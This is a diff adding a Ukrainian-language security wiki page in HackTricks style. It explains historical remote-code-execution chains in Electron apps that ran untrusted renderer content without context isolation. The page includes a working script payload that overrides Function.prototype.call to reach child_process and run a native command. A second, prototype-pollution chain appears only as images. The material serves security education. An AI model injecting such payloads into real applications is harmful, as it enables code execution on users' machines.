@@ -1,0 +1,68 @@
+# RCE в Electron через внутрішній код за відсутності ізоляції контексту
+
+{{#include ../../banners/hacktricks-training.md}}
+
+Це **історичні шаблони експлуатації** для застосунків Electron, які запускали недовірений вміст renderer без ізоляції контексту. Ізоляцію контексту ввімкнено за замовчуванням, починаючи з Electron 12, і вона залишається рекомендованим параметром безпеки.<sup>[[1]](#references)</sup> Точні внутрішні механізми відрізняються залежно від версій Electron і Node.js, тому відтворюйте ланцюжок на версіях, включених до цільового застосунку.
+
+## Приклад 1: перевизначення `Function.prototype.call`
+
+Цей приклад взято з презентації Масато Кінаґави на CureCon.<sup>[[2]](#references)</sup>
+
+У відповідній історичній збірці Electron внутрішній код ASAR реєстрував обробник події `exit` процесу. Оскільки за вимкненої ізоляції контексту код сторінки та внутрішній код Electron використовували спільні прототипи JavaScript, код renderer міг замінити `Function.prototype.call` до запуску внутрішнього обробника.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>
+
+```javascript
+process.on("exit", function () {
+  for (let p in cachedArchives) {
+    if (!hasProp.call(cachedArchives, p)) continue
+    cachedArchives[p].destroy()
+  }
+})
+```
+
+![Внутрішній шлях коду Electron asar.js, використаний у прикладі RCE через contextIsolation](<../../images/image (1070).png>)
+
+Listener викликався через механізм подій Node.js. На оригінальній сторінці було посилання на застарілий шлях `bin/events.js`; вихідний код тієї самої історичної версії міститься в `lib/events.js`.<sup>[[5]](#references)</sup>
+
+![Шлях коду Node.js events.js, до якого дійшов ланцюжок RCE через contextIsolation в Electron](<../../images/image (793).png>)
+
+У цьому шляху `self` — це об’єкт process у Node.js:
+
+![RCE через contextIsolation в Electron через внутрішній код Electron — приклад 1: де «self» є об’єктом process у Node.js](<../../images/image (700).png>)
+
+Історичний об’єкт process надавав шлях до `require`:
+
+```
+process.mainModule.require
+```
+
+Оскільки диспетчер прослуховувачів викликав обробник з об’єктом process, перевизначення call могло відновити цей об’єкт і виконати нативну команду:
+
+```html
+<script>
+  Function.prototype.call = function (process) {
+    process.mainModule.require("child_process").execSync("calc")
+  }
+  location.reload() // Trigger the listener during navigation
+</script>
+```
+
+## Приклад 2: prototype pollution
+
+Презентація ElectroVolt демонструє ще один історичний ланцюжок, який отримує об’єкт `require` через prototype pollution.<sup>[[4]](#references)</sup>
+
+Leak:
+
+<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>
+
+Exploit:
+
+<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>
+
+## References
+
+- [1] [Документація Electron - Ізоляція контексту](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
+- [2] [Electron: Зловживання відсутністю ізоляції контексту - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
+- [3] [Історичний вихідний код Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
+- [4] [ElectroVolt: Pwning популярних настільних програм і виявлення нової поверхні атаки в Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
+- [5] [Історичний вихідний код Node.js - диспетчеризація слухачів у `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
+{{#include ../../banners/hacktricks-training.md}}
